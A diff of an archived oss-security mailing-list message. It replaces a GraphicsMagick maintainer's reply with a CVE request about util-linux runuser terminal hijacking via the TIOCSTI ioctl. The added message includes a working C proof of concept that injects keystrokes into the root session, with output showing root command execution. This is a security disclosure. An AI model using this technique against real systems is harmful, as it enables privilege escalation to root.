@@ -1,41 +1,52 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/12/02/1
-Message-ID: <alpine.GSO.2.20.1612012111420.19696@freddy.simplesystems.org>
-Date: Thu, 1 Dec 2016 21:20:13 -0600 (CST)
-From: Bob Friesenhahn <bfriesen@...ple.dallas.tx.us>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/27/1
+Message-ID: <20160226155416.82785yodpagwmigw@webmail.alunos.dcc.fc.up.pt>
+Date: Fri, 26 Feb 2016 15:54:16 +0100
+From: up201407890@...nos.dcc.fc.up.pt
 To: oss-security@...ts.openwall.com
-Subject: Re: graphicsmagick: memory allocation failure in MagickRealloc (memory.c)
+Cc: cve-assign@...re.org
+Subject: CVE Request: util-linux runuser tty hijacking via TIOCSTI ioctl
 Content-Type: text/plain; charset=utf-8
 
-On Thu, 1 Dec 2016, Agostino Sarubbo wrote:
+This is a similar issue to the one I posted yesterday on oss-sec, but  
+to runuser(1) from util-linux, which can only be run as root for the  
+purpose of executing programs as another user.
 
-> If suitable for a CVE please assign one. Thanks.
->
-> Description:
-> Graphicsmagick is an Image Processing System.
->
-> This is an old memory failure, discovered time ago. The maintainer, Mr. Bob
-> Friesenhahn was able to reproduce the issue; I’m quoting his feedback about:
->
-> The problem is that the embedded JPEG data claims to have dimensions
-> 59395×56833 and
-> this is only learned after we are in the JPEG reader.
->
-> But for some reasons (maybe not easy to fix) it is still not fixed.
+https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=815922
 
-We did make an unreleased fix (Mercurial changeset 14953:38d0f281e8c8, 
-and earlier changeset 14831:28c0bb8bf89a), but perhaps not the way you 
-like.  The fix which was made was to require that the embedded JPEG 
-data has the same dimensions as the containing JNG file.  The existing 
-resource limit mechanism would then allow the user to constrain the 
-size of the JNG image.  The default constraints in a 64-bit build are 
-larger than what the JPEG format supports.
+When executing a program via "runuser -u nonpriv program" the
+nonpriv session can
+escape to the parent session by using the TIOCSTI ioctl to push
+characters into the
+terminal's input buffer, allowing privilege escalation.
+This issue has been fixed in "su" by calling setsid() and in "sudo" by
+using the "use_pty" flag
 
-It does not seem correct to change the default limits of the software 
-in order to make fuzzing easier.
+# cat test.c
+#include <sys/ioctl.h>
 
-Bob
--- 
-Bob Friesenhahn
-bfriesen@...ple.dallas.tx.us, http://www.simplesystems.org/users/bfriesen/
-GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
+int main()
+{
+char *cmd = "id\n";
+while(*cmd)
+ioctl(0, TIOCSTI, cmd++);
+}
+
+# gcc test.c -o test
+# id saken
+uid=1000(saken) gid=1000(saken) groups=1000(saken)
+
+# runuser -u saken ./test ---> last command i type in
+id
+# id ---> did not type this
+uid=0(root) gid=0(root) groups=0(root)
+
+
+I'd like to request a CVE for this issue.
+
+Thanks,
+Federico Bento
+
+----------------------------------------------------------------
+This message was sent using IMP, the Internet Messaging Program.
+
